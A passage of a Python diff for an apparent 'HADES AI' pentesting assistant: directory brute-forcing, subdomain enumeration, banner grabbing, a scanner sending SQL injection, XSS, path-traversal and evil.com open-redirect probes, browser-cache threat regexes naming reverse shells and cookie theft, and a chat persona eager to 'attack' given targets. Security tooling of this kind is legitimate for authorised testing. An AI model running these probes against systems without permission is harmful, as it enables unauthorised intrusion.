+        if not HAS_REQUESTS:
+            return {'error': 'requests not installed'}
+            
+        base_url = self.target
+        wordlist = self.options.get('wordlist', [
+            'admin', 'login', 'dashboard', 'api', 'config', 'backup', 'test',
+            'dev', 'staging', 'old', 'new', 'temp', 'tmp', 'uploads', 'files',
+            'images', 'js', 'css', 'assets', 'static', 'media', 'data', 'db',
+            'database', 'sql', 'php', 'wp-admin', 'wp-content', 'administrator',
+            '.git', '.env', 'robots.txt', 'sitemap.xml', '.htaccess', 'web.config'
+        ])
+        found = []
+        
+        self.output.emit(f"[*] Bruteforcing directories on {base_url}...")
+        
+        for i, path in enumerate(wordlist):
+            if self._stop:
+                break
+            try:
+                url = f"{base_url.rstrip('/')}/{path}"
+                r = requests.get(url, timeout=3, allow_redirects=False,
+                               headers={'User-Agent': 'Mozilla/5.0'})
+                if r.status_code not in [404]:
+                    found.append({'path': path, 'status': r.status_code, 'size': len(r.content)})
+                    self.output.emit(f"[+] Found: /{path} (Status: {r.status_code})")
+            except:
+                pass
+            self.progress.emit(int((i + 1) / len(wordlist) * 100))
+            
+        return {'tool': 'dir_bruteforce', 'target': base_url, 'findings': found, 'error': None}
+    
+    def _subdomain_enum(self) -> Dict:
+        domain = self.target
+        subdomains = ['www', 'mail', 'ftp', 'api', 'dev', 'staging', 'test', 'admin',
+                      'blog', 'shop', 'store', 'app', 'mobile', 'cdn', 'static', 'assets',
+                      'img', 'images', 'video', 'portal', 'secure', 'vpn', 'remote']
+        found = []
+        
+        self.output.emit(f"[*] Enumerating subdomains for {domain}...")
+        
+        for i, sub in enumerate(subdomains):
+            if self._stop:
+                break
+            try:
+                full = f"{sub}.{domain}"
+                socket.gethostbyname(full)
+                found.append(full)
+                self.output.emit(f"[+] Found: {full}")
+            except:
+                pass
+            self.progress.emit(int((i + 1) / len(subdomains) * 100))
+            
+        return {'tool': 'subdomain_enum', 'target': domain, 'findings': found, 'error': None}
+    
+    def _banner_grab(self) -> Dict:
+        host = self.target
+        ports = [21, 22, 23, 25, 80, 110, 143, 443, 993, 995, 3306, 3389, 8080]
+        banners = []
+        
+        self.output.emit(f"[*] Grabbing banners from {host}...")
+        
+        for i, port in enumerate(ports):
+            if self._stop:
+                break
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(2)
+                    s.connect((host, port))
+                    s.send(b"HEAD / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
+                    banner = s.recv(1024).decode('utf-8', errors='ignore')
+                    if banner:
+                        banners.append({'port': port, 'banner': banner[:200]})
+                        self.output.emit(f"[+] Port {port}: {banner[:100]}")
+            except:
+                pass
+            self.progress.emit(int((i + 1) / len(ports) * 100))
+            
+        return {'tool': 'banner_grab', 'target': host, 'findings': banners, 'error': None}
+    
+    def _vuln_scan(self) -> Dict:
+        if not HAS_REQUESTS:
+            return {'error': 'requests not installed'}
+            
+        url = self.target
+        vulns = []
+        
+        self.output.emit(f"[*] Scanning {url} for vulnerabilities...")
+        
+        # Test for common vulnerabilities
+        tests = [
+            ("SQL Injection", f"{url}?id=1'", "sql", ["error", "mysql", "syntax", "query"]),
+            ("XSS", f"{url}?q=<script>alert(1)</script>", "xss", ["<script>", "alert"]),
+            ("Path Traversal", f"{url}/../../../etc/passwd", "path", ["root:", "/bin/"]),
+            ("Open Redirect", f"{url}?url=https://evil.com", "redirect", ["evil.com"]),
+        ]
+        
+        for i, (name, test_url, vuln_type, indicators) in enumerate(tests):
+            if self._stop:
+                break
+            try:
+                r = requests.get(test_url, timeout=5, verify=False,
+                               headers={'User-Agent': 'Mozilla/5.0'})
+                for indicator in indicators:
+                    if indicator.lower() in r.text.lower():
+                        vulns.append({'type': vuln_type, 'name': name, 'url': test_url})
+                        self.output.emit(f"[!] Potential {name} found!")
+                        break
+            except:
+                pass
+            self.progress.emit(int((i + 1) / len(tests) * 100))
+            
+        return {'tool': 'vuln_scan', 'target': url, 'findings': vulns, 'error': None}
+
+
+# ============================================================================
+# BROWSER CACHE SCANNER
+# ============================================================================
+
+class BrowserScanner(QThread):
+    progress = pyqtSignal(int)
+    status = pyqtSignal(str)
+    finished_scan = pyqtSignal(dict)
+    finding_detected = pyqtSignal(dict)
+    
+    # Limits to prevent getting stuck
+    MAX_FILES_PER_BROWSER = 500  # Max files to scan per browser
+    MAX_TOTAL_FILES = 2000       # Max total files to scan
+    SCAN_TIMEOUT = 120           # Timeout in seconds per browser
+    
+    THREAT_PATTERNS = [
+        ('malware', r'malware|virus|trojan|ransomware', 'HIGH'),
+        ('exploit', r'exploit|overflow|shellcode|payload', 'HIGH'),
+        ('eval_code', r'eval\s*\(|exec\s*\(|Function\s*\(', 'HIGH'),
+        ('obfuscation', r'fromCharCode|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|atob\s*\(', 'MEDIUM'),
+        ('data_exfil', r'document\.cookie|localStorage|sessionStorage', 'MEDIUM'),
+        ('injection', r'<script|javascript:|on\w+\s*=', 'MEDIUM'),
+        ('crypto', r'crypto|bitcoin|wallet|miner', 'MEDIUM'),
+        ('backdoor', r'backdoor|c2|command.*control|reverse.*shell', 'HIGH'),
+    ]
+    
+    def __init__(self, kb: KnowledgeBase = None):
+        super().__init__()
+        self.kb = kb
+        self._stop = False
+        self.results = []
+        self.findings = []
+        self.stats = defaultdict(int)
+        self._files_scanned = 0
+        self._browser_file_count = 0
+        self._scan_start_time = 0
+        
+    def _get_browser_paths(self) -> Dict:
+        local = os.environ.get('LOCALAPPDATA', '')
+        roaming = os.environ.get('APPDATA', '')
+        
+        return {
+            'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
+            'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default'),
+            'Firefox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
+            'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+            'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
+        }
+        
+    def stop(self):
+        self._stop = True
+        
+    def run(self):
+        self.results = []
+        self.findings = []
+        self.stats = defaultdict(int)
+        self._files_scanned = 0
+        
+        browsers = self._get_browser_paths()
+        total = len(browsers)
+        
+        self.status.emit("Starting browser cache scan...")
+        
+        for i, (browser, path) in enumerate(browsers.items()):
+            if self._stop or self._files_scanned >= self.MAX_TOTAL_FILES:
+                break
+                
+            self._browser_file_count = 0
+            self._scan_start_time = time.time()
+            
+            self.status.emit(f"Scanning {browser}... ({self._files_scanned} files so far)")
+            
+            if os.path.exists(path):
+                try:
+                    self._scan_browser(browser, path)
+                except Exception as e:
+                    self.status.emit(f"Error scanning {browser}: {str(e)[:50]}")
+            else:
+                self.status.emit(f"{browser} not found, skipping...")
+                
+            self.progress.emit(int((i + 1) / total * 100))
+            
+        self.status.emit(f"Scan complete! {self._files_scanned} files scanned, {len(self.findings)} threats found.")
+        
+        self.finished_scan.emit({
+            'results': self.results[-100:],  # Limit results to prevent memory issues
+            'findings': self.findings,
+            'stats': dict(self.stats)
+        })
+        
+    def _scan_browser(self, browser: str, base_path: str):
+        cache_dirs = ['Cache', 'Code Cache', 'GPUCache', 'Service Worker']
+        
+        for cache_dir in cache_dirs:
+            if self._stop:
+                return
+            if self._browser_file_count >= self.MAX_FILES_PER_BROWSER:
+                self.status.emit(f"{browser}: Reached file limit ({self.MAX_FILES_PER_BROWSER}), moving on...")
+                return
+            if time.time() - self._scan_start_time > self.SCAN_TIMEOUT:
+                self.status.emit(f"{browser}: Timeout reached, moving on...")
+                return
+                
+            cache_path = os.path.join(base_path, cache_dir)
+            if os.path.exists(cache_path):
+                self._scan_directory(browser, cache_path)
+                
+    def _scan_directory(self, browser: str, path: str):
+        try:
+            file_count = 0
+            for root, dirs, files in os.walk(path):
+                if self._stop:
+                    return
+                    
+                # Check limits
+                if self._browser_file_count >= self.MAX_FILES_PER_BROWSER:
+                    return
+                if self._files_scanned >= self.MAX_TOTAL_FILES:
+                    return
+                if time.time() - self._scan_start_time > self.SCAN_TIMEOUT:
+                    return
+                
+                # Skip very deep directories
+                depth = root.replace(path, '').count(os.sep)
+                if depth > 5:
+                    continue
+                    
+                for filename in files[:100]:  # Limit files per directory
+                    if self._stop:
+                        return
+                    if self._browser_file_count >= self.MAX_FILES_PER_BROWSER:
+                        return
+                        
+                    filepath = os.path.join(root, filename)
+                    try:
+                        self._analyze_file(browser, filepath)
+                        self._files_scanned += 1
+                        self._browser_file_count += 1
+                        file_count += 1
+                        
+                        # Emit progress periodically
+                        if file_count % 50 == 0:
+                            self.status.emit(f"Scanning {browser}... ({self._browser_file_count} files)")
+                    except Exception:
+                        pass
+                        
+        except PermissionError:
+            pass
+        except Exception as e:
+            pass
+            
+    def _analyze_file(self, browser: str, filepath: str):
+        # Check stop flag immediately
+        if self._stop:
+            return
+            
+        try:
+            stat = os.stat(filepath)
+            size = stat.st_size
+            
+            if size > 5_000_000 or size == 0:
+                return
+            
+            # Check stop flag again before reading file
+            if self._stop:
+                return
+                
+            content_preview = ""
+            threats = []
+            raw_content = b''
+            
+            try:
+                with open(filepath, 'rb') as f:
+                    raw_content = f.read(50000)
+                    try:
+                        content = raw_content.decode('utf-8', errors='ignore')
+                        content_preview = content[:500]
+                        
+                        # Check stop flag before pattern matching
+                        if self._stop:
+                            return
+                        
+                        for threat_name, pattern, severity in self.THREAT_PATTERNS:
+                            if self._stop:
+                                return
+                            matches = re.findall(pattern, content, re.IGNORECASE)
+                            if matches:
+                                context_matches = re.findall(f'.{{0,50}}{pattern}.{{0,50}}', content, re.IGNORECASE)
+                                for match in context_matches[:3]:
+                                    if self._stop:
+                                        return
+                                    finding = ThreatFinding(
+                                        path=filepath,
+                                        threat_type=threat_name,
+                                        pattern=pattern,
+                                        severity=severity,
+                                        code_snippet=match.strip()[:200],
+                                        browser=browser,
+                                        context=content_preview
+                                    )
+                                    self.findings.append(finding)
+                                    threats.append(finding)
+                                    
+                                    if self.kb:
+                                        self.kb.store_threat_finding(finding)
+                                        
+                                    self.finding_detected.emit({
+                                        'path': filepath,
+                                        'type': threat_name,
+                                        'severity': severity,
+                                        'code': match.strip()[:200],
+                                        'browser': browser
+                                    })
+                                    
+                                    self._learn_from_finding(finding)
+                                    
+                    except:
+                        pass
+            except:
+                pass
+            
+            if self._stop:
+                return
+                
+            risk = 'HIGH' if threats else ('MEDIUM' if any(p in filepath.lower() for p in ['.exe', '.dll', 'script']) else 'LOW')
+            
+            self.stats['total_files'] += 1
+            self.stats['total_size'] += size
+            self.stats[f'{risk.lower()}_risk'] += 1
+            self.stats[browser] += 1
+            
+            if threats:
+                self.stats['threats'] += len(threats)
+                
+            self.results.append(CacheEntry(
+                path=filepath, size=size, modified=stat.st_mtime,
+                file_hash=hashlib.md5(raw_content[:1000]).hexdigest()[:8] if raw_content else '',
+                file_type=os.path.splitext(filepath)[1] or '.unknown',
+                risk_level=risk, browser=browser, content_preview=content_preview
+            ))
+            
+        except Exception as e:
+            pass
+            
+    def _learn_from_finding(self, finding: ThreatFinding):
+        if self.kb and finding.code_snippet:
+            pattern_id = hashlib.sha256(finding.code_snippet.encode()).hexdigest()[:16]
+            pattern = SecurityPattern(
+                pattern_id=pattern_id,
+                pattern_type=finding.threat_type,
+                signature=re.escape(finding.code_snippet[:50]),
+                confidence=0.7,
+                occurrences=1,
+                examples=[finding.code_snippet],
+                countermeasures=[],
+                cwe_ids=[]
+            )
+            self.kb.store_pattern(pattern)
+
+
+# ============================================================================
+# AI CHAT PROCESSOR
+# ============================================================================
+
+class ChatProcessor:
+    COMMANDS = {
+        'full_scan': ['scan https://', 'scan http://', 'full scan', 'recon ', 'go to work on', 'attack '],
+        'scan': ['scan ports', 'port scan', 'nmap', 'scan ports on'],
+        'bruteforce': ['bruteforce', 'brute force', 'dir scan', 'directory bruteforce'],
+        'subdomain': ['subdomain', 'subdomains', 'enum sub', 'find subdomains'],
+        'banner': ['banner', 'grab banner', 'service detection'],
+        'vuln': ['vuln scan', 'vulnerability scan', 'scan for vulnerabilities', 'find vulnerabilities'],
+        'learn': ['learn from', 'study', 'analyze url'],
+        'cache': ['scan cache', 'browser cache', 'cache scan', 'scan browser'],
+        'help': ['help', 'commands', 'what can you do', '?'],
+        'status': ['status', 'stats', 'statistics', 'show stats'],
+        'show_exploits': ['show exploits', 'show learned exploits', 'list exploits', 'learned exploits', 'view exploits'],
+        'show_findings': ['show findings', 'show threats', 'list findings', 'threat findings', 'view findings'],
+        'greeting': ['hello', 'hi ', 'hey', 'how are you', 'whats up', "what's up"],
+    }
+    
+    def __init__(self, kb: KnowledgeBase):
+        self.kb = kb
+        self.context = {}
+        
+    def process(self, message: str) -> Dict[str, Any]:
+        message_lower = message.lower().strip()
+        
+        self.kb.store_chat('user', message)
+        
+        # Check for exact/longer matches first (more specific commands)
+        matched_cmd = None
+        matched_len = 0
+        for cmd, triggers in self.COMMANDS.items():
+            for trigger in triggers:
+                if trigger in message_lower and len(trigger) > matched_len:
+                    matched_cmd = cmd
+                    matched_len = len(trigger)
+        
+        if matched_cmd:
+            return self._handle_command(matched_cmd, message)
+                
+        return self._generate_response(message)
+        
+    def _handle_command(self, cmd: str, message: str) -> Dict:
+        url_match = re.search(r'https?://[^\s]+', message)
+        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', message)
+        domain_match = re.search(r'\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b', message, re.IGNORECASE)
+        
+        target = url_match.group() if url_match else (ip_match.group() if ip_match else (domain_match.group() if domain_match else None))
+        
+        if cmd == 'greeting':
+            greetings = [
+                "Hey there! I'm HADES, your AI pentesting assistant. Ready to hunt some vulnerabilities? 🔥",
+                "Hello! HADES online and ready. What target shall we analyze today?",
+                "Greetings! I'm operational and eager to find security weaknesses. Give me a target!",
+                "Hey! I'm doing great, always ready to scan and exploit. What's our mission?",
+            ]
+            import random
+            return {'response': random.choice(greetings), 'action': None}
+        
+        if cmd == 'help':
+            return {
+                'response': """🔥 **HADES AI - Commands:**
+
+**Scanning:**
+• "scan https://example.com" - Full reconnaissance scan
+• "scan ports on 192.168.1.1" - Port scan
+• "vuln scan http://target.com" - Vulnerability scan
+
+**Reconnaissance:**
+• "find subdomains of example.com" - Subdomain enumeration  
+• "bruteforce http://target.com" - Directory bruteforce
+
+**Learning:**
+• "learn from https://exploit-db.com/..." - Learn exploits from URL
+• "scan browser cache" - Analyze cached files for threats
+
+**View Data:**
+• "show stats" - View statistics
+• "show exploits" - View learned exploits
+• "show findings" - View threat findings
+
+Just give me a URL or IP and I'll get to work!""",
+                'action': None
+            }
+        
+        if cmd == 'full_scan':
+            if not target:
+                return {
+                    'response': "I need a target URL or domain for a full scan. Try: 'scan https://example.com'",
+                    'action': None
+                }
+            return {
+                'response': f"🚀 **Initiating full reconnaissance on {target}**\n\nThis will:\n• Learn from the target URL\n• Check for exposed paths\n• Analyze security headers\n• Look for vulnerabilities\n\nStand by for results...",
+                'action': {'type': 'full_scan', 'target': target}
+            }
+            
+        if cmd == 'status':
+            stats = self._get_stats()
+            return {'response': stats, 'action': None}
+            
+        if cmd == 'show_exploits':
+            return self._show_learned_exploits()
+            
+        if cmd == 'show_findings':
+            return self._show_threat_findings()
+            
+        if cmd == 'cache':
+            return {
+                'response': "Starting browser cache scan. I'll analyze all cached files for threats and learn from any malicious patterns found.",
+                'action': {'type': 'cache_scan'}
+            }
+            
+        if not target and cmd not in ['cache', 'show_exploits', 'show_findings']:
+            return {
+                'response': f"I understand you want to {cmd}, but I need a target. Please provide an IP, domain, or URL.",
+                'action': None
+            }
+            
+        tool_map = {
+            'scan': 'port_scan',
+            'bruteforce': 'dir_bruteforce', 
+            'subdomain': 'subdomain_enum',
+            'banner': 'banner_grab',
+            'vuln': 'vuln_scan',
+            'learn': 'web_learn'
+        }
+        
+        return {
+            'response': f"Starting {cmd} on {target}. I'll report findings as I discover them.",
+            'action': {'type': tool_map.get(cmd, cmd), 'target': target}
+        }
+        
+    def _generate_response(self, message: str) -> Dict:
+        """Generate intelligent responses based on learned knowledge"""
+        message_lower = message.lower()
+        
+        # Query knowledge base for relevant information
+        knowledge = self.kb.query_knowledge(message)
+        techniques = knowledge.get('techniques', [])
+        cves = knowledge.get('cves', [])
+        exploits = self.kb.get_learned_exploits(5)
+        patterns = self.kb.get_patterns()
+        ip_info = knowledge.get('ip_info')
+        
+        # Check if message contains a URL or domain - probably wants to scan it
+        url_match = re.search(r'https?://[^\s]+', message)
+        domain_match = re.search(r'\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b', message, re.IGNORECASE)
+        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', message)
+        cve_match = re.search(r'CVE-\d{4}-\d+', message, re.IGNORECASE)
+        
+        # Handle CVE queries
+        if cve_match:
+            cve_id = cve_match.group().upper()
+            cve_results = self.kb.search_cves(cve_id, 1)
+            if cve_results:
+                cve = cve_results[0]
+                response = f"**{cve_id}**\n\n"
+                response += f"**Summary:** {cve['summary'][:300]}...\n\n"
+                response += f"**CVSS Score:** {cve['cvss']}\n"
+                if cve['mitigations']:
+                    response += f"\n**Mitigations:**\n"
+                    for m in cve['mitigations'][:3]:
+                        response += f"• {m}\n"
+            else:
+                response = f"I don't have information about {cve_id} yet. I can learn about it if you point me to a URL with its details."
+            self.kb.store_chat('assistant', response)
+            return {'response': response, 'action': None}
+        
+        # Handle IP reputation queries
+        if ip_match and ip_info:
+            ip = ip_match.group()
+            response = f"**IP Reputation for {ip}:**\n\n"
+            response += f"• **Threat Score:** {ip_info['threat_score']:.1f}/10\n"
+            response += f"• **Attack Count:** {ip_info['attack_count']}\n"
+            response += f"• **Categories:** {', '.join(ip_info['categories']) if ip_info['categories'] else 'None'}\n"
+            response += f"• **Status:** {'🚫 BLOCKED' if ip_info['is_blocked'] else '✅ Not blocked'}\n"
+            response += f"• **First Seen:** {ip_info['first_seen'][:10] if ip_info['first_seen'] else 'N/A'}\n"
+            
+            if ip_info['threat_score'] >= 5.0:
+                response += f"\n⚠️ **This IP is considered HIGH RISK.** Consider blocking it."
+            self.kb.store_chat('assistant', response)
+            return {'response': response, 'action': None}
+        
+        # Handle target detection
+        if url_match or domain_match:
+            target = url_match.group() if url_match else domain_match.group()
+            response = f"I detected a target: **{target}**\n\nWould you like me to scan it? Try:\n• 'scan {target}' - Full reconnaissance\n• 'learn from {target}' - Extract exploit patterns\n• 'vuln scan {target}' - Vulnerability scan"
+            self.kb.store_chat('assistant', response)
+            return {'response': response, 'action': None}
+        
+        # Handle security topic queries using learned knowledge
+        security_keywords = ['sql', 'injection', 'xss', 'csrf', 'brute', 'scan', 'attack', 
+                            'vulnerability', 'exploit', 'defense', 'protect', 'secure',
+                            'port', 'firewall', 'detect', 'intrusion', 'malware']
+        
+        matched_keyword = None
+        for keyword in security_keywords:
+            if keyword in message_lower:
+                matched_keyword = keyword
+                break
+        
+        if matched_keyword and (techniques or exploits):
+            response = self._build_knowledge_response(matched_keyword, techniques, exploits, patterns)
+            self.kb.store_chat('assistant', response)
+            return {'response': response, 'action': None}
+        
+        # Standard responses
+        if 'what' in message_lower and 'learn' in message_lower:
+            response = f"I've learned **{len(patterns)} security patterns** and **{len(exploits)} exploits** from various sources.\n\n"
+            if techniques:
+                response += f"**Techniques I Know ({len(techniques)}):**\n"
+                for t in techniques[:5]:
+                    response += f"• {t['name']} ({t['category']})\n"
+            if exploits:
+                response += f"\nRecent exploits from: {', '.join(set(e['source_url'][:30] for e in exploits[:3]))}"
+        elif 'exploit' in message_lower:
+            if exploits:
+                response = "Here are some exploits I've learned:\n"
+                for e in exploits[:3]:
+                    response += f"\n• **{e['exploit_type']}** from {e['source_url'][:40]}:\n```\n{e['code'][:150]}\n```\n"
+            else:
+                response = "I haven't learned any exploits yet. Point me to a URL with exploit code using 'learn from https://...'"
+        elif 'who' in message_lower and 'you' in message_lower:
+            response = "I'm **HADES** - a self-learning AI pentesting assistant. I can:\n\n"
+            response += "• 🔍 Scan targets for vulnerabilities\n"
+            response += "• 📚 Learn exploit patterns from websites\n"
+            response += "• 🛡️ Monitor network and auto-defend against attacks\n"
+            response += "• 💡 Provide security guidance based on my knowledge\n\n"
+            response += f"I currently know **{len(patterns)} patterns**, **{len(exploits)} exploits**, and **{len(techniques)} techniques**."
+        elif 'thank' in message_lower:
+            response = "You're welcome! Ready for the next target whenever you are. 🔥"
+        elif 'defend' in message_lower or 'protect' in message_lower or 'block' in message_lower:
+            response = self._get_defense_guidance(message_lower)
+        else:
+            # Try to find relevant knowledge anyway
+            if techniques:
+                response = f"Based on my knowledge, you might be interested in:\n\n"
+                for t in techniques[:2]:
+                    response += f"**{t['name']}** ({t['category']})\n"
+                    if t['mitigations']:
+                        response += f"  Mitigations: {', '.join(t['mitigations'][:2])}\n"
+                response += f"\nOr try: **'help'** for commands, **'show stats'** for statistics"
+            else:
+                response = "I'm not sure what you want me to do. Try:\n\n• **'scan https://example.com'** - Run a full scan\n• **'help'** - See all commands\n• **'show stats'** - View my statistics\n\nOr just give me a URL/IP and I'll figure out what to do with it!"
+            
+        self.kb.store_chat('assistant', response)
+        return {'response': response, 'action': None}
+    
+    def _build_knowledge_response(self, topic: str, techniques: List, exploits: List, patterns: List) -> str:
+        """Build an intelligent response based on learned knowledge"""
+        response = f"**🔍 Knowledge about '{topic}':**\n\n"
+        
+        # Add relevant techniques
+        relevant_techniques = [t for t in techniques if topic.lower() in t['name'].lower() 
+                              or topic.lower() in t['category'].lower() 
+                              or topic.lower() in t.get('description', '').lower()]
+        
+        if relevant_techniques:
+            response += "**Techniques:**\n"
+            for t in relevant_techniques[:3]:
+                response += f"• **{t['name']}** ({t['category']})\n"
+                if t['indicators']:
+                    response += f"  Indicators: {', '.join(t['indicators'][:2])}\n"
+                if t['mitigations']:
+                    response += f"  Mitigations: {', '.join(t['mitigations'][:2])}\n"
+        
+        # Add relevant exploits
+        relevant_exploits = [e for e in exploits if topic.lower() in e['exploit_type'].lower()]
+        if relevant_exploits:
+            response += f"\n**Learned Exploits ({len(relevant_exploits)}):**\n"
+            for e in relevant_exploits[:2]:
+                response += f"• {e['exploit_type']} from {e['source_url'][:40]}\n"
+        
+        # Add defensive guidance
+        response += f"\n**Defensive Recommendations:**\n"
+        if 'sql' in topic or 'injection' in topic:
+            response += "• Use parameterized queries/prepared statements\n• Implement input validation\n• Apply least privilege to database accounts\n"
+        elif 'xss' in topic:
+            response += "• Encode output properly\n• Use Content-Security-Policy headers\n• Validate and sanitize input\n"
+        elif 'brute' in topic:
+            response += "• Implement account lockout\n• Use MFA\n• Add rate limiting\n"
+        elif 'scan' in topic or 'port' in topic:
+            response += "• Use firewall rules to limit exposed ports\n• Implement port knocking\n• Use IDS/IPS systems\n"
+        else:
+            response += "• Keep systems updated\n• Monitor logs for anomalies\n• Implement defense in depth\n"
+        
+        return response
+    
+    def _get_defense_guidance(self, message: str) -> str:
+        """Provide defense guidance based on context"""
+        response = "**🛡️ Defense Guidance:**\n\n"
+        
+        if 'brute' in message or 'password' in message:
+            response += "**Against Brute Force:**\n"
+            response += "• Implement account lockout after 5 failed attempts\n"
+            response += "• Use MFA (multi-factor authentication)\n"
+            response += "• Add CAPTCHA after 3 failed attempts\n"
+            response += "• Use fail2ban or similar tools\n"
+        elif 'scan' in message or 'port' in message:
+            response += "**Against Port Scanning:**\n"
+            response += "• Enable firewall and close unnecessary ports\n"
+            response += "• Use port knocking for sensitive services\n"
+            response += "• Deploy IDS (Intrusion Detection System)\n"
+            response += "• Monitor for scanning patterns\n"
+        elif 'ddos' in message or 'dos' in message:
+            response += "**Against DDoS:**\n"
+            response += "• Use CDN with DDoS protection\n"
+            response += "• Implement rate limiting\n"
+            response += "• Have emergency response plan ready\n"
+        else:
+            response += "**General Security:**\n"
+            response += "• Keep all systems patched\n"
+            response += "• Enable HADES network monitoring with auto-defense\n"
+            response += "• Regularly review logs and alerts\n"
+            response += "• Implement least privilege access\n"
+        
+        response += "\n**Tip:** Enable my Network Monitor with Defense Mode for automatic protection!"
+        return response
+        
+    def _get_stats(self) -> str:
+        cursor = self.kb.conn.cursor()
+        cursor.execute('SELECT COUNT(*) FROM experiences')
+        exp_count = cursor.fetchone()[0]
+        cursor.execute('SELECT COUNT(*) FROM security_patterns')
+        pattern_count = cursor.fetchone()[0]
+        cursor.execute('SELECT COUNT(*) FROM learned_exploits')
+        exploit_count = cursor.fetchone()[0]
+        cursor.execute('SELECT COUNT(*) FROM threat_findings')
+        threat_count = cursor.fetchone()[0]
+        
+        return f"""**HADES AI Statistics:**
+• Experiences: {exp_count}
+• Learned Patterns: {pattern_count}
+• Learned Exploits: {exploit_count}
+• Threats Detected: {threat_count}
+
+I'm continuously learning from cache scans and websites you point me to."""
+
+    def _show_learned_exploits(self) -> Dict:
+        """Show all learned exploits from the database"""
+        exploits = self.kb.get_learned_exploits(20)
+        
+        if not exploits:
+            return {
+                'response': "**No exploits learned yet.**\n\nTo learn exploits, use:\n• `learn from https://exploit-db.com/...`\n• `scan browser cache` to find cached exploits",
+                'action': None
+            }
+        
+        # Group by type
+        exploit_types = {}
+        for e in exploits:
+            t = e['exploit_type']
+            if t not in exploit_types:
+                exploit_types[t] = []
+            exploit_types[t].append(e)
+        
+        response = f"**📚 Learned Exploits ({len(exploits)} total):**\n\n"
+        
+        for exploit_type, type_exploits in exploit_types.items():
+            response += f"**{exploit_type.upper()}** ({len(type_exploits)} variants):\n"
+            for e in type_exploits[:5]:
+                source = e['source_url'][:50] + "..." if len(e['source_url']) > 50 else e['source_url']
+                success_rate = e['success_count'] / max(1, e['success_count'] + e['fail_count'])
+                response += f"  • Source: {source}\n"
+                response += f"    Success Rate: {success_rate:.0%} | Learned: {e['learned_at'][:10]}\n"
+                # Show first line of code
+                code_preview = e['code'].split('\n')[0][:60]
+                response += f"    Code: `{code_preview}...`\n"
+            response += "\n"
+        
+        return {'response': response, 'action': None}
+    
+    def _show_threat_findings(self) -> Dict:
+        """Show all threat findings from the database"""
+        findings = self.kb.get_threat_findings(20)
+        
+        if not findings:
+            return {
+                'response': "**No threats detected yet.**\n\nTo detect threats:\n• `scan browser cache` to analyze cached files\n• `vuln scan http://target.com` to scan a target",
+                'action': None
+            }
+        
+        # Group by severity
+        by_severity = {'HIGH': [], 'MEDIUM': [], 'LOW': []}
+        for f in findings:
+            sev = f.get('severity', 'LOW')
+            if sev in by_severity:
+                by_severity[sev].append(f)
+        
+        response = f"**🔍 Threat Findings ({len(findings)} total):**\n\n"
+        
+        for severity in ['HIGH', 'MEDIUM', 'LOW']:
+            sev_findings = by_severity[severity]
+            if sev_findings:
+                emoji = {'HIGH': '🔴', 'MEDIUM': '🟠', 'LOW': '🟢'}[severity]
+                response += f"**{emoji} {severity}** ({len(sev_findings)} findings):\n"
+                for f in sev_findings[:5]:
+                    path_short = f['path'][-40:] if len(f['path']) > 40 else f['path']
+                    response += f"  • **{f['threat_type']}** in `{path_short}`\n"
+                    response += f"    Browser: {f['browser']} | Pattern: `{f.get('pattern', 'N/A')[:30]}`\n"
+                response += "\n"
+        
+        return {'response': response, 'action': None}
+
+
+# ============================================================================
+# CODE EDITOR ASSISTANT - GPT-Powered Code Analysis
+# ============================================================================
+
+class CodeEditorAssistant:
+    """Enhanced Code Editor Assistant with GPT integration and file operations"""
+    
+    def __init__(self):
+        self.current_code = ""
+        self.files = {}  # filename -> code str
+        self.last_code = ""
+        self.mode = 'chat'  # Modes: chat, code, explain, assist
+        
+    def set_code(self, code: str):
+        self.current_code = code
+        self.last_code = code
+        
+    def load_file(self, filename: str) -> str:
+        """Load a file into memory for editing"""
+        try:
+            with open(filename, 'r', encoding='utf-8') as f:
+                self.files[filename] = f.read()
+                self.current_code = self.files[filename]
+                return f"[📂] Loaded file: {filename} ({len(self.files[filename])} chars)"
+        except Exception as e:
+            return f"[❌] Failed to load {filename}: {e}"
+    
+    def save_file(self, filename: str) -> str:
+        """Save the current code to a file"""
+        if filename not in self.files:
+            return "[⚠️] File not loaded. Use load_file first."
+        try:
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(self.files[filename])
+            return f"[💾] File saved: {filename}"
+        except Exception as e:
+            return f"[❌] Save failed: {e}"
+    
+    def analyze_file(self, filename: str) -> str:
+        """Analyze a loaded file and return function info"""
+        if filename not in self.files:
+            return "[⚠️] File not loaded."
+        try:
+            code = self.files[filename]
+            tree = ast.parse(code)
+            result = []
+            for node in tree.body:
+                if isinstance(node, ast.FunctionDef):
+                    func_name = node.name
+                    args = [arg.arg for arg in node.args.args]
+                    docstring = ast.get_docstring(node)
+                    lines = len(node.body)
+                    result.append(f"🔎 Function `{func_name}`: args={args}, lines={lines}, doc={docstring or 'None'}")
+                elif isinstance(node, ast.ClassDef):
+                    class_name = node.name
+                    methods = [n.name for n in node.body if isinstance(n, ast.FunctionDef)]
+                    result.append(f"📦 Class `{class_name}`: methods={methods}")
+            return "\n".join(result) if result else "[ℹ️] No functions or classes found."
+        except Exception as e:
+            return f"[❌] Analysis Error:\n{traceback.format_exc()}"
+    
+    def explain_code(self, code_str: str) -> str:
+        """Explain Python code structure"""
+        try:
+            tree = ast.parse(code_str)
+            explanations = []
+            for node in tree.body:
+                if isinstance(node, ast.FunctionDef):
+                    args = [arg.arg for arg in node.args.args]
+                    explanations.append(f"📘 Function `{node.name}` takes args: {args}")
+                elif isinstance(node, ast.ClassDef):
+                    explanations.append(f"📦 Class `{node.name}` defined")
+                elif isinstance(node, ast.Import):
+                    modules = [alias.name for alias in node.names]
+                    explanations.append(f"📦 Imports modules: {modules}")
+                elif isinstance(node, ast.ImportFrom):
